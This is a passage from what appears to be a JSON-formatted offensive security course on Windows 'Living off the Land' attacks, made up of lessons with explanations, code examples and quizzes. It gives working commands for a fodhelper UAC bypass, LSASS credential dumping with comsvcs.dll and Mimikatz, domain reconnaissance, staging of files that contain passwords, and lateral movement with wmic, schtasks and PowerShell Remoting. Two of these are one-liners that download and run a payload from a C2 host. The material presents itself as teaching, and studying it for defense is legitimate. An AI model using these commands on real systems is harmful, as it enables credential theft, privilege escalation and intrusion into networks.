                        "content": "<p>When a user who is a member of the local Administrators group logs in, they are actually given two access tokens: a standard user token and a full administrator token. By default, programs run with the standard user token.</p><p>When a program needs to perform an administrative action, it will trigger a <strong>UAC prompt</strong>. If the user clicks 'Yes', the program is then run with the full administrator token. UAC is designed to prevent unauthorized changes and to make the user aware when a program is trying to perform a high-privilege action.</p>",
                        "image": "https://i.imgur.com/u7nL6Xk.png"
                    },
                    {
                        "title": "The fodhelper.exe Bypass",
                        "content": "<p>Certain legitimate Windows executables are configured to 'auto-elevate', meaning they can run with high privileges without showing a UAC prompt. The binary `fodhelper.exe` (which is related to managing optional Windows features) is one of these.</p><p>The bypass works by abusing how `fodhelper.exe` looks for its commands in the registry. An attacker running as a standard user can create a specific registry key under the current user's hive (`HKCU`). When the auto-elevating `fodhelper.exe` is run, it will check this registry key. The attacker can set the default value of this key to be the path to their malicious executable. Because `fodhelper.exe` is running in a high-integrity (elevated) context, it will execute the attacker's payload with those same high privileges, completely bypassing the UAC prompt.</p>",
                        "image": "https://i.imgur.com/F0f5d8g.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "fodhelper.exe UAC Bypass (Registry manipulation)",
                        "language": "batch",
                        "code": ":: This is a two-step process to perform the fodhelper UAC bypass.\n:: This is run from the context of a standard user who is in the Administrators group.\n\n:: 1. Create the necessary registry key and set its default value to be our payload.\n:: The specific key is HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\n\nreg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /t REG_SZ /d \"\" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /t REG_SZ /d \"C:\\temp\\payload.exe\" /f\n\n:: 2. Execute fodhelper.exe.\n:: Because it is an auto-elevating binary, it will run with high integrity.\n:: It will then read our hijacked registry key and execute our payload with those same high privileges.\nfodhelper.exe\n\n:: After this, payload.exe will be running as a high-integrity process, having bypassed UAC."
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary purpose of User Account Control (UAC) in Windows?",
                        "options": [
                            "To act as an antivirus.",
                            "To prevent unauthorized, high-privilege actions from being taken without the user's consent.",
                            "To manage user passwords.",
                            "To act as a firewall."
                        ],
                        "correct": 1,
                        "explanation": "UAC is a consent and elevation mechanism. It's a barrier designed to stop programs (and malware) from silently making system-wide changes without the administrator's approval."
                    },
                    {
                        "id": 2,
                        "question": "The `fodhelper.exe` UAC bypass works by abusing what?",
                        "options": [
                            "A memory corruption vulnerability.",
                            "The fact that `fodhelper.exe` auto-elevates and can be tricked into executing a command specified in a registry key that a standard user can control.",
                            "A network-based vulnerability.",
                            "A misconfigured service."
                        ],
                        "correct": 1,
                        "explanation": "This is a logic flaw. The vulnerability is in the execution chain: the auto-elevating program reads a configuration setting from a location that a low-privilege user can write to. This is a classic example of a Time-of-Check to Time-of-Use (TOCTOU) style bug."
                    },
                    {
                        "id": 3,
                        "question": "A UAC bypass is a form of what?",
                        "options": [
                            "Initial Access",
                            "Persistence",
                            "Local Privilege Escalation",
                            "Lateral Movement"
                        ],
                        "correct": 2,
                        "explanation": "A UAC bypass is used to escalate from a medium-integrity process (the default for an admin user) to a high-integrity process, effectively 'unlocking' the user's full administrative privileges. This is a form of local privilege escalation."
                    }
                ]
            }
        },
        {
            "id": "lesson-15",
            "title": "In-Memory Credential Dumping with comsvcs.dll",
            "duration": "75 min",
            "objectives": [
                "Understand the goal of dumping the LSASS process memory",
                "Learn how the MiniDump function can be used for this purpose",
                "Explore how to use rundll32.exe and comsvcs.dll to perform the dump",
                "Analyze why this is a stealthier alternative to using Mimikatz.exe",
                "Practice dumping LSASS memory using this LotL technique"
            ],
            "content": {
                "overview": "Dumping the memory of the LSASS process is the key to harvesting credentials on a Windows host. While `Mimikatz.exe` is the most famous tool for this, it is also heavily signatured by security products. This lesson covers a powerful 'Living off the Land' technique to dump LSASS memory using only the built-in `rundll32.exe` and a legitimate system DLL, `comsvcs.dll`.",
                "sections": [
                    {
                        "title": "The Goal: Dumping LSASS",
                        "content": "<p>As covered before, the <strong>LSASS (Local Security Authority Subsystem Service)</strong> process stores user credentials in memory. An attacker with administrator privileges wants to create a 'dump file' of this process's memory. This file can then be taken offline and analyzed with a tool like Mimikatz to extract all the plaintext passwords, NTLM hashes, and Kerberos tickets without running the risky `mimikatz.exe` on the live target machine.</p>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "The Technique: Abusing comsvcs.dll",
                        "content": "<p>The legitimate system library `comsvcs.dll`, which is part of the Microsoft COM+ services, exports a function called <strong>MiniDump</strong>. This function is designed for debugging and can be used to create a memory dump of any running process.</p><p>An attacker can abuse this by using the LotL binary `rundll32.exe` to call this specific, exported function from `comsvcs.dll`. The attacker provides the Process ID (PID) of LSASS and the desired output path for the dump file. The result is a full memory dump of LSASS, created by only using legitimate, trusted Windows binaries. This is much stealthier than dropping and running a known hacking tool like `mimikatz.exe`.</p>",
                        "image": "https://i.imgur.com/F0f5d8g.png"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\temp\\lsass.dmp full",
                    "language": "batch",
                    "code": ":: This is a powerful, fileless technique for dumping LSASS memory.\n:: It requires administrator privileges.\n\n:: 1. Find the Process ID (PID) of the LSASS process.\ntasklist | findstr lsass.exe\n:: > lsass.exe                    660 Services                   0    13,420 K\n:: (In this example, the PID is 660)\n\n:: 2. Use rundll32.exe to call the MiniDump function from comsvcs.dll.\n::    Provide the PID, the output path, and the 'full' dump option.\nrundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 660 C:\\temp\\lsass.dmp full\n\n:: 3. The attacker now has the memory dump file 'lsass.dmp'.\n::    They can exfiltrate this file and run Mimikatz against it on their own machine.\n::    mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" \"exit\""
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of dumping the LSASS process memory?",
                        "options": [
                            "To crash the system.",
                            "To create a file that can be analyzed offline to extract credentials like passwords and NTLM hashes.",
                            "To improve the performance of the LSASS process.",
                            "To find software vulnerabilities."
                        ],
                        "correct": 1,
                        "explanation": "Dumping LSASS is the fundamental technique for credential harvesting on Windows. The memory of this process is a treasure trove of secrets."
                    },
                    {
                        "id": 2,
                        "question": "The `comsvcs.dll` technique is considered a 'Living off the Land' technique because...",
                        "options": [
                            "It uses a custom-built hacking tool.",
                            "It abuses legitimate, built-in Windows components (`rundll32.exe` and `comsvcs.dll`) to perform a malicious action.",
                            "It is a network-based attack.",
                            "It only works on older versions of Windows."
                        ],
                        "correct": 1,
                        "explanation": "This is a perfect example of LotL. The attacker is using trusted, signed Microsoft binaries to perform a core credential dumping action, making it much stealthier than dropping a known tool like Mimikatz."
                    },
                    {
                        "id": 3,
                        "question": "What legitimate function, exported by `comsvcs.dll`, is abused in this technique?",
                        "options": [
                            "CreateProcess",
                            "WriteFile",
                            "MiniDump",
                            "DeleteService"
                        ],
                        "correct": 2,
                        "explanation": "The `MiniDump` function is a legitimate debugging tool that developers can use to create crash dumps. Attackers simply repurpose this legitimate functionality for their own malicious goals."
                    }
                ]
            }
        },
        
        {
            "id": "lesson-16",
            "title": "Active Directory Enumeration with dsquery.exe and nltest.exe",
            "duration": "75 min",
            "objectives": [
                "Understand the role of native AD query tools",
                "Learn how to use dsquery.exe to find users, groups, and computers",
                "Explore the use of nltest.exe to enumerate domain controllers and trusts",
                "Analyze how to perform AD reconnaissance without third-party scripts"
            ],
            "content": {
                "overview": "While tools like BloodHound are incredibly powerful, they are third-party executables that may be blocked or detected. This lesson focuses on 'Living off the Land' for Active Directory enumeration, using the built-in command-line tools that exist on all domain-joined Windows machines to map out the AD environment.",
                "sections": [
                    {
                        "title": "Querying AD with dsquery.exe",
                        "content": "<p><strong>dsquery.exe</strong> is a powerful, built-in command-line tool for querying Active Directory using a lightweight LDAP syntax. Any authenticated user can use it to find detailed information about the domain.</p><h3>Common Enumeration Commands:</h3><ul><li><code>dsquery user</code>: Find users in the directory. Can be filtered by name, group, or other attributes.</li><li><code>dsquery group</code>: Find groups.</li><li><code>dsquery computer</code>: Find computer objects, which can help identify high-value targets like servers.</li><li><code>dsquery * -filter \"(objectCategory=person)\"</code>: A generic query to find all user objects in the domain.</li></ul>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Enumerating Domain Controllers with nltest.exe",
                        "content": "<p><strong>nltest.exe</strong> is a utility used for testing and querying domain trusts and the status of domain controllers. For an attacker, it's a quick and easy way to find the most important servers in the network.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Finding the Crown Jewels</strong></div><p>The command <code>nltest /dclist:corp.local</code> will query the domain `corp.local` and return a list of all its Domain Controllers. This provides the attacker with a clear list of their primary targets. Other `nltest` commands can be used to enumerate domain and forest trusts, helping the attacker to understand if they can move from one compromised domain to another.</p></div>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "dsquery and nltest commands",
                    "language": "batch",
                    "code": ":: Find all users whose name starts with 'admin'\ndsquery user -name admin*\n\n:: Find all computers in the 'Servers' Organizational Unit (OU)\ndsquery computer OU=Servers,DC=corp,DC=local\n\n:: Get a list of all Domain Controllers for the 'corp.local' domain\nnltest /dclist:corp.local\n\n:: Check the trust relationships for the 'corp.local' domain\nnltest /domain_trusts"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "The `dsquery.exe` utility is primarily used for what purpose?",
                        "options": [
                            "To run scripts.",
                            "To query Active Directory for information about objects like users, groups, and computers.",
                            "To manage system services.",
                            "To change user passwords."
                        ],
                        "correct": 1,
                        "explanation": "`dsquery` is the native command-line LDAP query tool for Windows, making it a perfect LotL binary for AD enumeration."
                    },
                    {
                        "id": 2,
                        "question": "Which command would an attacker use to get a definitive list of all Domain Controllers for their current domain?",
                        "options": [
                            "dsquery computer",
                            "net view /domain",
                            "nltest /dclist:<domain_name>",
                            "hostname"
                        ],
                        "correct": 2,
                        "explanation": "`nltest /dclist` is the most direct and reliable built-in command for enumerating Domain Controllers, which are the attacker's highest-value targets."
                    },
                    {
                        "id": 3,
                        "question": "Why would an attacker choose to use `dsquery` and `nltest` instead of a more powerful tool like BloodHound?",
                        "options": [
                            "Because they are more powerful.",
                            "To be stealthier. These are built-in, signed Microsoft binaries, and their use is less likely to be flagged as malicious than the execution of a third-party reconnaissance tool.",
                            "Because BloodHound is difficult to use.",
                            "Because they provide more information."
                        ],
                        "correct": 1,
                        "explanation": "This is a key trade-off in LotL. While third-party tools might be more efficient, using the native binaries is a stealth technique that helps the attacker blend in with normal administrative activity."
                    }
                ]
            }
        },
        {
            "id": "lesson-17",
            "title": "Network Reconnaissance with net.exe",
            "duration": "75 min",
            "objectives": [
                "Understand the power of the `net` command suite for enumeration",
                "Learn how to discover domain users and groups",
                "Explore techniques for finding network shares and active sessions",
                "Analyze how to combine `net` commands to map the network environment"
            ],
            "content": {
                "overview": "The `net.exe` binary is one of the oldest and most powerful LotL tools on Windows. It is a suite of commands that can be used to interact with and manage almost every aspect of the local machine and the wider domain network. This lesson focuses on using `net.exe` for comprehensive network and domain reconnaissance.",
                "sections": [
                    {
                        "title": "Enumerating Users and Groups",
                        "content": "<p>The `net user` and `net group` commands are the primary way to enumerate domain accounts from the command line.</p><ul><li><code>net user [username] /domain</code>: Get detailed information about a specific user in the domain, including their group memberships.</li><li><code>net group [groupname] /domain</code>: Get a list of all the members of a specific domain group. An attacker's first query is almost always `net group \"Domain Admins\" /domain`.</li></ul>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Discovering Network Shares and Sessions",
                        "content": "<p>Finding open network shares is a key goal for an attacker looking for sensitive data.</p><ul><li><code>net view</code>: Lists all computers in the current domain.</li><li><code>net view \\\\COMPUTERNAME</code>: Lists all the open file shares on a specific remote computer.</li><li><code>net session \\\\COMPUTERNAME</code>: Lists all the active user sessions on a remote computer. This can be a goldmine, as it tells the attacker which users are currently logged into which machines, helping them to find a target for lateral movement.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "net group \"Domain Admins\" /domain",
                        "language": "batch",
                        "code": ":: Find all members of the Domain Admins group\nnet group \"Domain Admins\" /domain\n\n:: Find all computers in the domain\nnet view /domain\n\n:: Find all file shares on a specific server named FILE-SRV01\nnet view \\\\FILE-SRV01\n\n:: See who is logged into the FILE-SRV01 server\nnet session \\\\FILE-SRV01\n\n:: Get detailed information about the 'jsmith' user account\nnet user jsmith /domain"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "Which command would an attacker use to find a list of all members of the 'Domain Admins' group?",
                        "options": [
                            "net user /domain",
                            "net view",
                            "net group \"Domain Admins\" /domain",
                            "tasklist"
                        ],
                        "correct": 2,
                        "explanation": "This is one of the first commands an attacker will run after compromising a domain-joined host. It gives them a clear list of their high-value target accounts."
                    },
                    {
                        "id": 2,
                        "question": "What information does the `net view \\\\COMPUTERNAME` command provide?",
                        "options": [
                            "The processes running on the remote computer.",
                            "A list of all the file shares on the remote computer.",
                            "The operating system of the remote computer.",
                            "The users logged into the remote computer."
                        ],
                        "correct": 1,
                        "explanation": "This command allows an attacker to discover network shares, which are a primary target for finding and collecting sensitive data."
                    },
                    {
                        "id": 3,
                        "question": "Why is the `net session` command so valuable for an attacker planning lateral movement?",
                        "options": [
                            "It is not valuable.",
                            "It tells them which users are currently logged into a remote machine, allowing them to target a machine where a high-privilege user is active.",
                            "It allows them to end a user's session.",
                            "It shows the computer's password."
                        ],
                        "correct": 1,
                        "explanation": "If an attacker wants to steal the credentials of a Domain Admin, the `net session` command can tell them exactly which machine that Domain Admin is currently logged into. The attacker can then target that specific machine for credential dumping."
                    }
                ]
            }
        },
        {
            "id": "lesson-18",
            "title": "File Searching and Data Staging with forfiles.exe and findstr.exe",
            "duration": "60 min",
            "objectives": [
                "Understand the 'Collection' tactic in a LotL context",
                "Learn how to use findstr.exe to search for files containing keywords",
                "Explore how to use forfiles.exe to perform actions on files recursively",
                "Combine these tools to find and stage sensitive data for exfiltration"
            ],
            "content": {
                "overview": "Once an attacker has access to a file server, they need a way to search through potentially millions of files to find the sensitive data they are looking for. This lesson covers how to use the built-in Windows command-line tools `findstr.exe` and `forfiles.exe` to automate this data collection process.",
                "sections": [
                    {
                        "title": "Searching for Keywords with findstr.exe",
                        "content": "<p><strong>findstr.exe</strong> is the Windows equivalent of the Linux `grep` command. It can be used to search for specific strings or patterns within files.</p><p>An attacker can use `findstr` to recursively search through an entire file share for files that contain sensitive keywords like 'password', 'confidential', 'secret', or 'private key'. This allows them to quickly narrow down a huge number of files to a small, interesting subset.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Recursive Actions with forfiles.exe",
                        "content": "<p><strong>forfiles.exe</strong> is a utility that can select files in a folder or an entire directory tree and execute a command on them. This is a very powerful tool for automation.</p><p>An attacker can combine `forfiles` with `findstr`. They can use `forfiles` to iterate through every `.txt` and `.csv` file on a server, and for each file, execute a `findstr` command to search for the keyword 'password'. If the keyword is found, another command can be used to copy that file to a staging directory.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "forfiles /S /M *.txt /C \"cmd /c findstr /I password @path\"",
                        "language": "batch",
                        "code": ":: This command combines forfiles and findstr to search for sensitive data.\n\n:: forfiles: The command.\n:: /S : Recurse into subdirectories.\n:: /M *.txt : The search mask. Only look at files ending in .txt.\n:: /C \"...\" : The command to execute for each file found.\n\n:: Inside the command:\n:: cmd /c : Run the following command.\n:: findstr /I password : Search case-insensitively for the word 'password'.\n:: @path : A special variable that forfiles replaces with the full path to the current file.\n\n:: To stage the files that are found, we can add a conditional copy:\nforfiles /S /M *.xml /C \"cmd /c findstr /I /C:\"<password>\" @path && copy @path C:\\temp\\loot\\\""
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "The `findstr.exe` utility is the Windows equivalent of which common Linux tool?",
                        "options": [
                            "ls",
                            "pwd",
                            "grep",
                            "ssh"
                        ],
                        "correct": 2,
                        "explanation": "Both `findstr` and `grep` are powerful command-line tools for searching for patterns and strings within text files."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary purpose of the `forfiles.exe` command?",
                        "options": [
                            "To search for files.",
                            "To recursively select a set of files and execute a command on each one.",
                            "To delete files.",
                            "To create new files."
                        ],
                        "correct": 1,
                        "explanation": "`forfiles` is a looping and automation tool. It allows an operator to perform a batch action on a large number of files at once, which is perfect for data collection."
                    },
                    {
                        "id": 3,
                        "question": "What does the `@path` variable do within a `forfiles` command?",
                        "options": [
                            "It specifies the path to the `forfiles.exe` binary.",
                            "It is a placeholder that is replaced with the full path of the file currently being processed.",
                            "It sets the current directory.",
                            "It is an error."
                        ],
                        "correct": 1,
                        "explanation": "The `@path` variable is the key to making `forfiles` useful. It allows the command being executed (like `findstr` or `copy`) to operate on the specific file that `forfiles` has found in its loop."
                    }
                ]
            }
        },
        {
            "id": "lesson-19",
            "title": "Lateral Movement with wmic.exe",
            "duration": "75 min",
            "objectives": [
                "Understand the function of Windows Management Instrumentation (WMI)",
                "Learn how to use the wmic.exe command-line tool for remote administration",
                "Explore how to use wmic.exe to execute commands and processes on remote machines",
                "Analyze the stealth benefits of using WMI for lateral movement"
            ],
            "content": {
                "overview": "`wmic.exe` is the command-line interface for Windows Management Instrumentation (WMI), a powerful, built-in framework for managing Windows systems. Because it is a legitimate and ubiquitous administrative tool, attackers frequently abuse it to execute code on remote machines and move laterally through a network.",
                "sections": [
                    {
                        "title": "Windows Management Instrumentation (WMI)",
                        "content": "<p><strong>WMI</strong> is the infrastructure for management data and operations on Windows-based operating systems. It can be used to query or change almost any setting on a local or remote computer, from hardware properties to running processes and services.</p><p>Administrators use WMI for legitimate remote management. Attackers abuse it for the exact same reason. If an attacker has administrative credentials for a remote machine, they can use WMI to execute their payload on it without ever having to log in via RDP or use another tool like PsExec.</p>",
                        "image": "https://i.imgur.com/u7y7o9o.png"
                    },
                    {
                        "title": "Remote Execution with wmic.exe",
                        "content": "<p>The `wmic.exe` utility provides a command-line interface to WMI. The `process call create` method is the key to remote execution.</p><p>An attacker can use a single `wmic` command to tell a remote computer to create a new process. This command can be anything the attacker wants, such as launching `powershell.exe` to download and run their C2 implant. This is a very powerful lateral movement technique because it is 'fileless' on the attacker's machine, and the execution is proxied through the legitimate WMI service on the remote machine, making it stealthier than other methods.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "wmic.exe /node:\"<remote_host>\" process call create \"C:\\temp\\payload.exe\"",
                    "language": "batch",
                    "code": ":: This command uses wmic.exe to execute a process on a remote machine.\n:: The attacker must have administrative credentials for the remote host.\n\n:: /node:\"TARGET-PC-01\" : The remote host to target.\n:: /user:CORP\\dadmin /password:Password123 : The credentials to use.\n:: process call create \"...\" : The WMI method to create a new process.\n\n# Example 1: Execute a payload that has already been copied to the target\nwmic.exe /node:\"TARGET-PC-01\" /user:CORP\\dadmin /password:Password123 process call create \"C:\\Windows\\Temp\\beacon.exe\"\n\n# Example 2: A fully fileless one-liner to download and execute\nwmic.exe /node:\"TARGET-PC-01\" process call create \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://c2/p.ps1')\""
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is WMI (Windows Management Instrumentation)?",
                        "options": [
                            "A security product.",
                            "A built-in Windows framework for managing local and remote systems.",
                            "A type of malware.",
                            "A network protocol."
                        ],
                        "correct": 1,
                        "explanation": "WMI is a core component of the Windows OS for management and administration. Its powerful remote capabilities make it a prime target for LotL abuse."
                    },
                    {
                        "id": 2,
                        "question": "Which `wmic.exe` command is used to execute a process on a remote machine?",
                        "options": [
                            "process get list",
                            "service call start",
                            "process call create",
                            "share get path"
                        ],
                        "correct": 2,
                        "explanation": "The `process call create` method is the WMI equivalent of 'run this command'. It is the primary function an attacker abuses for remote execution via WMI."
                    },
                    {
                        "id": 3,
                        "question": "Why is using WMI for lateral movement often considered stealthier than using a tool like PsExec?",
                        "options": [
                            "Because it is faster.",
                            "Because PsExec has to drop a binary service on the target, while WMI is a native, agentless protocol and the execution is handled by the built-in WMI service.",
                            "Because it is encrypted.",
                            "It is not stealthier."
                        ],
                        "correct": 1,
                        "explanation": "WMI is a 'fileless' lateral movement technique from the attacker's perspective. It doesn't require dropping any new files on the target system to work, which means there are fewer artifacts for a defender to find."
                    }
                ]
            }
        },
        {
            "id": "lesson-20",
            "title": "Lateral Movement with schtasks.exe (Remote)",
            "duration": "60 min",
            "objectives": [
                "Understand how the Task Scheduler can be managed remotely",
                "Learn how to use schtasks.exe to create a task on a remote computer",
                "Explore how to use a one-time scheduled task for immediate execution",
                "Analyze the stealth benefits of this technique"
            ],
            "content": {
                "overview": "We have already seen how the Task Scheduler can be used for persistence. However, `schtasks.exe` can also be used to manage tasks on remote computers. This allows an attacker to abuse it as a powerful and stealthy lateral movement technique.",
                "sections": [
                    {
                        "title": "Remote Task Creation",
                        "content": "<p>If an attacker has administrative credentials for a remote host, they can use `schtasks.exe` to create a new scheduled task on that machine from their own compromised host.</p><p>This is a very reliable method for code execution. The attacker can create a task that runs their payload, and because the task is created and executed by the legitimate Task Scheduler service on the remote machine, it can be a very effective way to bypass some security controls.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "One-Time Tasks for Immediate Execution",
                        "content": "<p>While `schtasks.exe` is great for persistence, it can also be used for immediate execution. An attacker can create a task on a remote machine that is scheduled to run 'once' at a time that is just one minute in the future.</p><p>The Task Scheduler service on the remote host will see the new task and execute the attacker's payload at the specified time. The attacker can then use `schtasks.exe` again to delete the task, removing the evidence. This provides a simple but effective way to get a C2 beacon running on a new machine.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "schtasks.exe /create /s <remote_host> /tn \"RemoteTask\" /tr \"C:\\temp\\payload.exe\" /sc once /st 00:00",
                    "language": "batch",
                    "code": ":: This command uses schtasks.exe for lateral movement.\n:: The attacker must have credentials for the remote host.\n\n:: /create : Create a new task.\n:: /s TARGET-PC-01 : The remote system to create the task on.\n:: /u CORP\\dadmin /p Password123 : The credentials to use.\n:: /tn \"RemoteTask\" : The name of the task.\n:: /tr \"C:\\temp\\payload.exe\" : The payload to run (must already be on the target).\n:: /sc once : Set the schedule to run only one time.\n:: /st 14:30 : The time to run the task. An attacker would set this to a minute from now.\n\nschtasks /create /s TARGET-PC-01 /u CORP\\dadmin /p Password123 /tn \"Remote Execution\" /tr \"C:\\Windows\\Temp\\beacon.exe\" /sc once /st 14:30\n\n:: After the task runs, the attacker can clean up:\nschtasks /delete /s TARGET-PC-01 /u CORP\\dadmin /p Password123 /tn \"Remote Execution\" /f"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary purpose of using `schtasks.exe` for lateral movement?",
                        "options": [
                            "To establish persistence.",
                            "To create and run a scheduled task on a remote computer to achieve code execution.",
                            "To enumerate scheduled tasks on the local machine.",
                            "To delete a scheduled task."
                        ],
                        "correct": 1,
                        "explanation": "The `/s` flag in `schtasks.exe` allows it to target a remote computer. This turns it from just a persistence tool into a powerful lateral movement tool, as it leverages a core, trusted OS service."
                    },
                    {
                        "id": 2,
                        "question": "What does the `/sc once` flag do?",
                        "options": [
                            "It makes the task run every minute.",
                            "It makes the task run when a user logs on.",
                            "It configures the task to run only a single time at the specified start time (`/st`).",
                            "It prevents the task from running."
                        ],
                        "correct": 2,
                        "explanation": "This is the key to using `schtasks.exe` for immediate execution rather than long-term persistence. The attacker can schedule the task to run in the very near future to get their payload executed quickly."
                    },
                    {
                        "id": 3,
                        "question": "Using `schtasks.exe` for lateral movement requires what?",
                        "options": [
                            "No special permissions.",
                            "The attacker to have administrative credentials on the remote target machine.",
                            "The remote machine to be a Domain Controller.",
                            "A software vulnerability."
                        ],
                        "correct": 1,
                        "explanation": "Like most administrative LotL techniques for lateral movement, this is a post-exploitation technique. It requires the attacker to have already compromised a set of privileged credentials."
                    }
                ]
            }
        },
        {
            "id": "lesson-21",
            "title": "Lateral Movement with WinRM and PowerShell Remoting",
            "duration": "75 min",
            "objectives": [
                "Understand the function of Windows Remote Management (WinRM)",
                "Learn how to use PowerShell Remoting for lateral movement",
                "Explore the `Invoke-Command` cmdlet for remote execution",
                "Analyze the security implications of enabling WinRM in an enterprise"
            ],
            "content": {
                "overview": "Windows Remote Management (WinRM) is the modern protocol for managing Windows servers. It is often enabled by default in enterprise environments, making it a powerful and convenient tool for administrators—and for attackers. This lesson covers how to abuse WinRM and PowerShell Remoting to achieve stealthy lateral movement.",
                "sections": [
                    {
                        "title": "PowerShell Remoting",
                        "content": "<p><strong>PowerShell Remoting</strong> allows an administrator to run PowerShell commands and scripts on a remote machine. It uses the WinRM protocol, which communicates over HTTP/S, making its traffic firewall-friendly.</p><p>If an attacker has compromised the credentials of a user who is in the 'Remote Management Users' group on a target server, they can use PowerShell Remoting to gain full, interactive access to that server. This is a very clean and powerful way to move laterally, as it is a built-in, legitimate feature of the operating system.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "The Invoke-Command Cmdlet",
                        "content": "<p>The primary PowerShell cmdlet for remote execution is <strong>`Invoke-Command`</strong>. An attacker can use this to run a single command or an entire script block on one or more remote computers.</p><p>This is an extremely efficient way to move laterally. An attacker can use `Invoke-Command` to run their in-memory C2 stager on a new machine, gaining a new beacon without ever writing a file to the target's disk. The entire operation is fileless and proxied through the legitimate WinRM service.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Invoke-Command -ComputerName <remote_host> -ScriptBlock { C:\\temp\\payload.exe }",
                    "language": "powershell",
                    "code": "# PowerShell Remoting provides several powerful cmdlets for lateral movement.\n# The attacker must have the necessary credentials and network access to the remote host.\n\n# --- Example 1: Get an interactive session on a remote computer ---\nEnter-PSSession -ComputerName TARGET-SRV01\n\n# --- Example 2: Run a single command on a remote computer ---\nInvoke-Command -ComputerName TARGET-SRV01 -ScriptBlock { whoami }\n\n# --- Example 3: Use Invoke-Command to run a fileless C2 stager ---\n$ScriptBlock = {\n    IEX(New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')\n}\nInvoke-Command -ComputerName TARGET-SRV01 -ScriptBlock $ScriptBlock"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary protocol used by PowerShell Remoting?",
                        "options": [
                            "SMB",
                            "RDP",
                            "SSH",
                            "WinRM (over HTTP/S)"
                        ],
                        "correct": 3,
                        "explanation": "WinRM is the underlying protocol. Because it uses standard web ports, it is often allowed through internal firewalls, making it a reliable channel for lateral movement."
                    },
                    {
                        "id": 2,
                        "question": "What does the `Invoke-Command` cmdlet in PowerShell do?",
                        "options": [
                            "It opens a graphical desktop session.",
                            "It executes a command or script block on a remote computer.",
                            "It creates a scheduled task.",
                            "It downloads a file."
                        ],
                        "correct": 1,
                        "explanation": "`Invoke-Command` is the primary workhorse for non-interactive remote execution in PowerShell, making it a favorite tool for attackers to move laterally."
                    },
                    {
                        "id": 3,
                        "question": "Why is using PowerShell Remoting a stealthy lateral movement technique?",
                        "options": [
                            "Because it is a legitimate administrative feature, and the traffic is encrypted over HTTPS (if configured).",
                            "Because it is very slow.",
                            "Because it does not generate any logs.",
                            "Because it is a new and unknown technique."
                        ],
                        "correct": 0,
                        "explanation": "Like other LotL techniques, abusing PowerShell Remoting allows an attacker's activity to blend in with the legitimate remote management that is constantly happening in a large enterprise network."
                    }
                ]
            }
        },
        {
            "id": "lesson-22",
            "title": "Collection using diskshadow.exe",
            "duration": "60 min",
            "objectives": [
                "Understand the function of the Volume Shadow Copy Service (VSS)",
                "Learn how diskshadow.exe can be used to interact with VSS",
                "Explore how to use VSS to access locked files like NTDS.dit",
                "Practice writing a diskshadow script to expose and copy NTDS.dit"
            ],
            "content": {
                "overview": "The most valuable file on a Windows Domain Controller is the `NTDS.dit` database, which stores all the Active Directory password hashes. However, this file is constantly in use and locked by the operating system, so it can't be copied directly. This lesson covers how attackers use a legitimate backup utility, `diskshadow.exe`, to access and steal this critical file.",
                "sections": [
                    {
                        "title": "The Volume Shadow Copy Service (VSS)",
                        "content": "<p><strong>VSS</strong> is a built-in Windows technology that allows you to create point-in-time copies, or 'shadow copies', of a volume, even while it is in use. This is essential for backing up live systems.</p><p>Attackers can abuse this feature. By creating a new shadow copy of the C: drive, they can get access to a static, unlocked version of any file on the system, including the `NTDS.dit` database.</p>",
                        "image": "https://i.imgur.com/fgS4fG3.png"
                    },
                    {
                        "title": "Abusing diskshadow.exe",
